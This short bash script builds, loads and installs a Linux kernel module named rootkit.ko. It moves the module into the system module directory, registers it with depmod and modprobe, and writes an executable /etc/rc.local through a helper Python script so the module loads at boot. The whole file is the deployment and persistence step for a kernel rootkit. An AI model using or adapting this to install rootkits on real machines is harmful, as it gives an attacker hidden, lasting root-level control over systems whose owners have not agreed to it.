#!/bin/bash

sudo rmmod rootkit.ko
make all

sudo insmod rootkit.ko
mv rootkit.ko /lib/modules/`uname -r`
sudo depmod -a
make clean
sudo modprobe rootkit
sudo touch /etc/rc.local
sudo python3 create_rc.py
sudo chmod +x /etc/rc.local
